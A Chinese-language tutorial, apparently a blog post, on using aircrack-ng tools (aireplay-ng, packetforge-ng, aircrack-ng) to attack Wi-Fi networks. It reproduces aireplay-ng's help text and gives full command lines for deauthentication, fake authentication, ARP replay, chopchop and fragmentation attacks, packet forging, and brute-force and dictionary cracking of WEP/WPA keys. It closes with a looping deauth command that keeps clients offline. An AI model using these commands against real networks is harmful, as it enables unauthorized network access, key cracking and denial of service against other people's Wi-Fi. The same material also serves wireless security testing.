```
 usage: aireplay-ng <options> <replay interface>

  Filter options:

      -b bssid  : MAC address, Access Point
      -d dmac   : MAC address, Destination
      -s smac   : MAC address, Source
      -m len    : minimum packet length
      -n len    : maximum packet length
      -u type   : frame control, type    field
      -v subt   : frame control, subtype field
      -t tods   : frame control, To      DS bit
      -f fromds : frame control, From    DS bit
      -w iswep  : frame control, WEP     bit
      -D        : disable AP detection

  Replay options:

      -x nbpps  : number of packets per second
      -p fctrl  : set frame control word (hex)
      -a bssid  : set Access Point MAC address
      -c dmac   : set Destination  MAC address
      -h smac   : set Source       MAC address
      -g value  : change ring buffer size (default: 8)
      -F        : choose first matching packet

      Fakeauth attack options:

      -e essid  : set target AP SSID
      -o npckts : number of packets per burst (0=auto, default: 1)
      -q sec    : seconds between keep-alives
      -Q        : send reassociation requests
      -y prga   : keystream for shared key auth
      -T n      : exit after retry fake auth request n time

      Arp Replay attack options:

      -j        : inject FromDS packets

      Fragmentation attack options:

      -k IP     : set destination IP in fragments
      -l IP     : set source IP in fragments

      Test attack options:

      -B        : activates the bitrate test

  Source options:

      -i iface  : capture packets from this interface
      -r file   : extract packets from this pcap file

  Miscellaneous options:

      -R                    : disable /dev/rtc usage
      --ignore-negative-one : if the interface's channel can't be determined,
                              ignore the mismatch, needed for unpatched cfg80211

  Attack modes (numbers can still be used):

      --deauth      count : deauthenticate 1 or all stations (-0)
      --fakeauth    delay : fake authentication with AP (-1)
      --interactive       : interactive frame selection (-2)
      --arpreplay         : standard ARP-request replay (-3)
      --chopchop          : decrypt/chopchop WEP packet (-4)
      --fragment          : generates valid keystream   (-5)
      --caffe-latte       : query a client for new IVs  (-6)
      --cfrag             : fragments against a client  (-7)
      --migmode           : attacks WPA migration mode  (-8)
      --test              : tests injection and quality (-9)

      --help              : Displays this usage screen

```

aireplay-ng是aircrack-ng套件里的一款抓包工具，aireplay-ng 中集成了10种攻击方式，分别是：

Attack 0: Deauthentication [解除认证](http://www.aircrack-ng.org/doku.php?id=deauthentication)  
 Attack 1: Fake authentication [伪造身份验证](http://www.aircrack-ng.org/doku.php?id=fake_authentication)  
 Attack 2: Interactive packet replay [交互式数据包重播](http://www.aircrack-ng.org/doku.php?id=interactive_packet_replay)  
 Attack 3: ARP request replay attack [ARP请求重播攻击](http://www.aircrack-ng.org/doku.php?id=arp-request_reinjection)  
 Attack 4: KoreK chopchop attack [KoreK斩杀攻击](http://www.aircrack-ng.org/doku.php?id=korek_chopchop)  
 Attack 5: Fragmentation attack [碎片攻击](http://www.aircrack-ng.org/doku.php?id=fragmentation)  
 Attack 6: Cafe-latte attack [咖啡拿铁攻击](http://www.aircrack-ng.org/doku.php?id=cafe-latte)  
 Attack 7: Client-oriented fragmentation attack [面向客户的分片攻击](http://www.aircrack-ng.org/doku.php?id=hirte)  
 Attack 8: WPA Migration Mode [WPA迁移模式](http://www.aircrack-ng.org/doku.php?id=wpa_migration_mode)  
 Attack 9: Injection test [注射试验](http://www.aircrack-ng.org/doku.php?id=injection_test)

Aireplay-ng 的 6 种攻击模式详解

* -0 Deautenticate 冲突模式

主要是伪造一个disassocate包,让ap断开与客户端的链接,此时客户端会重新连接ap,那么我们从中可能得到的东西有:

1,假如AP不广播ESSID,那么我们可以得到这个ESSID;

2.如果使用的是[WP](https://www.2cto.com/kf/yidong/wp/)A/WPA2的[加密](https://www.2cto.com/article/jiami/)方式,通过这样做强迫客户端重新验证,我们就能够获得握手包;

3.再重新连接过程中我们可以获取到ARP数据包,为-3攻击做准备.

```
aireplay-ng -0 10 –a <ap mac> -c <my mac> wifi0 参数说明：
【-0】：冲突攻击模式，后面跟发送次数（设置为 0，则为循环攻击，不停的断开连接，客户端无法正常上网）
【-a】：设置 ap 的 mac
【-c】：设置已连接的合法客户端的 mac。
如果不设置-c，则断开所有和 ap 连接的合法客户端。
aireplay-ng -3 -b <ap mac> -h <my mac> wifi0
```

注：使用此攻击模式的前提是必须有通过认证的合法的客户端连接到路由器

* -1 fakeauth count 伪装客户端连接

这种模式是伪装一个客户端和 AP 进行连接。

这步是无客户端的研究学习的第一步，因为是无合法连接的客户端，因此需要一个伪装客户端来和路由器相连。为让 AP 接受数据包，必须使自己的网卡和 AP 关联。如果没有关联的话，目标 AP 将忽略所有从你网卡发送的数据包，IVS 数据将不会产生。

用-1 伪装客户端成功连接以后才能发送注入命令，让路由器接受到注入命令后才可反馈数据从而产生 ARP 包。

aireplay-ng -1 0 –e &lt;ap essid&gt; -a &lt;ap mac&gt; -h &lt;my mac&gt; wifi0

参数说明：

【-1】：伪装客户端连接模式，后面跟延时

【-e】：设置 ap 的 essid

【-a】：设置 ap 的 mac

【-h】：设置伪装客户端的网卡 MAC（即自己网卡 mac）

> 前我一直也没弄明白为什么能够进行伪连接,既然我们并不知道WEP密码,那么如何进行连接?伪连接的伪主要体现在什么地方?这个应该是和AP的工作机制有关.我自己的理解是,在客户端与AP通信的时候,客户端需要在AP那里登记自己的MAC地址,这样AP才会接受这个MAC地址的网卡产生的数据包进行下一步的工作.一般WEP验证过程为:1.客户端发给AP认证请求 2.AP发回挑战字串 3.客户端利用WEP密码加密字串返回给AP 4.AP对返回结果进行本地匹配判断是否通过认证. 伪连接实际上就是进行了第1步,此后AP就登记了客户端的MAC地址,此时AP等待的是客户端返回挑战字串的加密包,对于攻击者,此时AP已经能够接受各种伪装生成的数据包并对其作出反应了.这一步对于无客户端的-2,-4,-5攻击相当重要.很明显,这样伪连接并不产生任何ARP包,同时也不会获得正确的WPA/WPA2握手包.

* -2 Interactive 交互模式

这种攻击模式是一个抓包和提数据发攻击包，三种集合一起的模式

1．这种模式主要用于研究学习无客户端，先用-1 建立虚假客户端连接然后直接发包攻击 ,

aireplay-ng -2 -p 0841 -c ff:ff:ff:ff:ff:ff -b &lt;ap mac&gt; -h &lt;my mac&gt; wifi0

参数说明：

【-2】：交互攻击模式

【-p】：设置控制帧中包含的信息（16 进制），默认采用 0841

【-c】：设置目标 mac 地址

【-b】：设置 ap 的 mac 地址

【-h】：设置伪装客户端的网卡 MAC（即自己网卡 mac）

2．提取包，发送注入数据包 aireplay-ng -2 –r &lt;file&gt; -x 1024 wifi0 发包攻击.其中，-x 1024 是限定发包速度，避免网卡死机，可以选择 1024。

-3 ARP-request 注入攻击模式

这种模式是一种抓包后分析重发的过程 这种攻击模式很有效。既可以利用合法客户端，也可以配合-1 利用虚拟连接的伪装客户端。如果有合法客户端那一般需要等几分钟，让合法客户端和 ap 之间通信，少量数据就可产生有效 ARP request 才可利用-3模式注入成功。如果没有任何通信存在，不能得到 ARP request.，则这种攻击就会失败。

如果合法客户端和ap之间长时间内没有 ARP request，可以尝试同时使用-0 攻击. 如果没有合法客户端，则可以利用-1 建立虚拟连接的伪装客户端，连接过程中获得验证数据包，从而产生有效 ARP request。再通过-3 模式注入。

aireplay-ng -3 -b &lt;ap mac&gt; -h &lt;my mac&gt; -x 512 wifi0

参数说明：

【-3】：arp 注入攻击模式

【-b】：设置 ap 的 mac

【-h】：设置

【-x】：定义每秒发送数据户包的数量，但是最高不超过 1024，建议使用 512（也可不定义）

-4 Chopchop 攻击模式

用以获得一个包含密钥数据的 xor 文件 这种模式主要是获得一个可利用包含密钥数据的 xor 文件，不能用来解密数据包。而是用它来产生一个新的数据包以便我们可以进行注入。

aireplay-ng -4 -b &lt;ap mac&gt; -h &lt;my mac&gt; wifi0 参数说明：

【-b】：设置需要研究学习的 AP 的 mac

【-h】：设置虚拟伪装连接的 mac（即自己网卡的 mac）

-5 fragment 碎片包攻击模式

用以获得 PRGA\(包含密钥的后缀为 xor 的文件\) 这种模式主要是获得一个可利用 PRGA，这里的 PRGA 并不是 wep key 数据，不能用来解密数据包。而是用它来产生一个新的数据包以便我们可以进行注入。其工作原理就是使目标 AP 重新广播包，当 AP 重广播时，一个新的 IVS 将产生，我们就是利用这个来研究学习 !

aireplay-ng -5 -b &lt;ap mac&gt; -h &lt;my mac&gt; wifi0

【-5】：碎片包攻击模式

【-b】：设置 ap 的 mac

【-h】：设置虚拟伪装连接的 mac（即自己网卡的 mac）

Packetforge-ng：数据包制造程序 Packetforge-ng &lt;mode&gt; &lt;options&gt;Mode

【-0】：伪造 ARP 包

packetforge-ng -0 -a &lt;ap mac&gt; -h &lt;my mac&gt; wifi0 –k 255.255.255.255 -l 255.255.255.255–y&lt;.xor file&gt; -w mrarp

参数说明：

【-0】：伪装 arp 数据包

【-a】：设置 ap 的 mac

【-h】设置虚拟伪装连接的 mac（即自己的 mac）

【-k】&lt;ip\[:port\]&gt;说明：设置目标文件 IP 和端口

【-l】&lt;ip\[:port\]&gt;说明：设置源文件 IP 和端口

【-y】&lt;file&gt;说明：从 xor 文件中读取 PRGA。后面跟 xor 的文件名。

【-w】设置伪装的 arp 包的文件名 Aircrack-ng：WEP 及 WPA-PSK key 研究学习主程序

Aircrack-ng \[optin\] &lt;.cap/.ivs file&gt;Optin aircrack-ng -n 64 -b &lt;ap mac&gt; name-01.ivs \)

参数说明：

【-n】：设置 WEP KEY 长度（64/128/152/256/512）aircrack-ng -x -f 2 name-01h.cap

参数说明：

【-x】：设置为暴力研究学习模式

【-f】：设置复杂程度，wep 密码设置为 1，wpa 密码设置为 2 aircrack-ng -w password.txt ciw.cap

【-w】：设置为字典研究学习模式，后面跟字典文件，再后面跟是我们即时保存的那个捕获到 WPA 验证的抓包文件。



aireplay-ng在后面数据分析环节中担任非常重要的的角色，他的作用是抓取重要数据包，并用于为后面的字典暴击破解。

为了加速握手包的获取，我们可以使用aireplay来给AP发送断开包：

```
aireplay-ng -0 0 -a C8:3A:35:5E:93:C0
```

解释：-0为模式中的一种：冲突攻击模式，后面跟发送次数（设置为0，则为循环攻击，不停的断开连接，客户端无法正常上网，-a 指定无线AP的mac地址，即为该无线网的bssid值，上图可以一目了然。

